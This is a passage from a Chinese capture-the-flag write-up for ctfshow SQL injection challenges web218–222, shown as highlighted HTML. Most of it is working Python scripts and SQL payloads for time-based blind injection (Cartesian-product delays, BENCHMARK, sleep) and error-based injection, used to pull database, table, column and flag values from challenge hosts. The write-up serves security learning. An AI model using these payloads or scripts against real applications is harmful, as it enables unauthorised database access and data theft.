</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>,</span><span class=n>sleep</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>虽然延时不长，但是可以看出结果并没有错误</p><h2 id=web219>web219</h2><p>笛卡尔积，当表没有指定连接条件(<code>join</code>)时，数据库会执行笛卡尔积操作，笛卡尔积的结果行数 = 每个表的行数相乘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=n>A</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>B</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>D</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>F</span><span class=p>,</span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=k>G</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>H</span><span class=p>,</span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=n>I</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>本地尝试效果不是特别好，因为我数据库比较小</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://7cafa34f-18aa-4753-b381-e634e88e709c.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=o>=</span><span class=s2>&#34;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;1) or if ((ascii(substr((select database()),{0},1)))&lt;{1},{2},0)#&#34;.format(i,mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxca</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39;),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagaabc</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;1) or if ((ascii(substr((select flagaabc from ctfshow_flagxca),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,</span><span class=si>{2}</span><span class=s2>,0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>,</span><span class=n>sleep</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web220>web220</h2><p>还是用笛卡尔积，但是过滤了好多函数，我们用其他函数来绕过一下，所以我们二分法也用不了了，只能遍历了，改改脚本，这里可以用<code>left\right\mid\substring</code>，只不过切片的写法和结果不同，还有一个注意的点就是这几个函数都不能和<code>group_concat</code>共用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>(</span><span class=k>left</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>flagaabcc</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_flagxcac</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>3</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;ctf&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>(</span><span class=k>right</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>flagaabcc</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_flagxcac</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;c&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>(</span><span class=n>mid</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>flagaabcc</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_flagxcac</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;c&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>(</span><span class=k>substring</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>flagaabcc</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_flagxcac</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;ctf&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://7630ebf6-7c41-4d1c-9c58-d11e3fdc7946.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=o>=</span><span class=s2>&#34;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&#34;</span>
</span></span><span class=line><span class=cl><span class=n>strings</span><span class=o>=</span><span class=s2>&#34;_-</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_uppercase</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>found</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>strings</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>temp_target</span> <span class=o>=</span> <span class=n>target</span> <span class=o>+</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if((left((select database()),{0})=&#39;{1}&#39;),{2},0)-- +&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, temp_target, sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if((left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0})=&#39;{1}&#39;),{2},0)-- +&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, temp_target, sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxcac</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if((left((select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1),{0})=&#39;{1}&#39;),{2},0)-- +&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, temp_target, sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># flagaabcc</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;1) or if((left((select flagaabcc from ctfshow_flagxcac limit 0,1),</span><span class=si>{0}</span><span class=s2>)=&#39;</span><span class=si>{1}</span><span class=s2>&#39;),</span><span class=si>{2}</span><span class=s2>,0)-- +&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>temp_target</span><span class=p>,</span> <span class=n>sleep</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span> <span class=o>&gt;</span> <span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;gogogo&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span><span class=o>=</span><span class=n>temp_target</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=n>found</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web221>web221</h2><p>limit注入，有版本限制，当时wolvctf2025的时候我看过一篇<a class=link href=https://lightless.me/archives/111.html target=_blank rel=noopener>文章</a>，算是浅浅的了解了一下，主要就是利用报错注入和时间盲注，写写payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>User</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>Host</span><span class=w> </span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=k>Host</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=w> </span><span class=k>procedure</span><span class=w> </span><span class=k>analyse</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=n>rand</span><span class=p>(),</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x3a</span><span class=p>,</span><span class=k>version</span><span class=p>())),</span><span class=mi>1</span><span class=p>);</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=k>User</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>Host</span><span class=w> </span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=k>Host</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=w> </span><span class=k>PROCEDURE</span><span class=w> </span><span class=k>analyse</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=n>rand</span><span class=p>(),</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x3a</span><span class=p>,(</span><span class=k>IF</span><span class=p>(</span><span class=n>MID</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=mi>5</span><span class=p>,</span><span class=w> </span><span class=n>BENCHMARK</span><span class=p>(</span><span class=mi>100000000</span><span class=p>,</span><span class=n>SHA1</span><span class=p>(</span><span class=mi>1</span><span class=p>)),</span><span class=mi>1</span><span class=p>))))),</span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-sql-injection/QQ20250502-114938.jpg width=1277 height=895 loading=lazy alt=1></p><p>打入即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?page=1&amp;limit=1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,BENCHMARK(10000000,SHA1(1)))),1)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?page=1&amp;limit=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000000,SHA1(1)),1))))),1);
</span></span></code></pre></td></tr></table></div></div><p>但是好像没有select，所以不成功，不然也不会只让拿库名了，报错可以直接打到所有</p><h2 id=web222>web222</h2><p>有两种方法，一种是报错一种是sleep</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=n>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>10</span><span class=p>),</span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=k>if</span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span><span class=s2>&#34;username&#34;</span><span class=p>,</span><span class=n>cot</span><span class=p>(</span><span class=mi>0</span><span class=p>)));</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?u=concat((if(ascii(substr((select database()),1,1))&lt;100, sleep(0.05), 0)), 1)
</span></span><span class=line><span class=cl>/api/?u=concat((if(ascii(substr((select database()),1,1)&lt;100), sleep(0.05),0)),1)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?u=concat((if(ascii(substr((select database()),1,1))&lt;100, 1, cot(0))), 1)
</span></span></code></pre></td></tr></table></div></div><p>写个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://333e3c35-f236-4d29-b6e1-65d85739e14f.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span><span class=o>+</span><span class=n>tail</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;concat((if(ascii(substr((select database()),{0},1))&lt;{1}, 1, cot(0))), 1)&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;concat((if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},1))&lt;{1}, 1, cot(0))), 1)&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flaga</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;concat((if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flaga&#39;),{0},1))&lt;{1}, 1, cot(0))), 1)&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
